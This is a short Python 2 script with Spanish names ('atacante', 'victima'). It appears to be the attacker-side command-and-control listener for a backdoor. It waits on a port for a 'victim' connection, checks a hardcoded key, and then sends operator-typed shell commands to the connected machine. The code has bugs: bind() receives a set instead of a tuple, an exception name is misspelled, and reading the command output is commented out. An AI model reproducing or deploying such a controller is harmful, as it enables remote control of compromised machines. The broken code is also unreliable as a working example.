#!usr/bin/python
# -*- coding: utf-8 -*-

import socket, sys

class atacante(object):
	def __init__(self):
		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.host = "localhost"
		self.port = 6890
		self.key = "12345"

	def main(self):
		self.server.bind({self.host, self.port})
		self.server.listen(1)
		print "[INFO] Esperando establecer conexion..."
		while True:
			victima, direccion = self.server.accept()
			print "[+] Conexion establecida {0}".format(direccion[0])
			a = self.autenticar(victima)
			if a == "si":
				self.cmd(victima)


	def autenticar (self, victima):
		peticion = victima.recv(4096)
		if peticion == self.key:
			return "si"

	def cmd(self, victima):
		while True:
			try:
				cmd = raw_input("\033[1;31m>> \033[0;m")
				victima.send(cmd)
				#salida = victima.recv(4096)
				#print salida
			except keyboardInterrupt: 
				sys.exit(1)


if __name__ == "__main__":
	app = atacante()
	app.main()

